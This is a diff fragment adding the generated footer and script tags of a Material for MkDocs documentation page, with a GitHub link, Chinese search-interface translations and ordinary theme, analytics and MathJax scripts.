+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+        
+      </div>
+      
+  <div class="md-footer-social">
+    
+      
+      
+        
+        
+      
+      <a href="https://github.com/fengchenzxc" target="_blank" rel="noopener" title="github.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
+      </a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": [], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}, "search": "../../../../assets/javascripts/workers/search.fe42c31b.min.js", "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.7353b375.min.js"></script>
+      
+        <script src="../../../../js/extra.js"></script>
+      
+        <script src="../../../../js/baidu-tongji.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
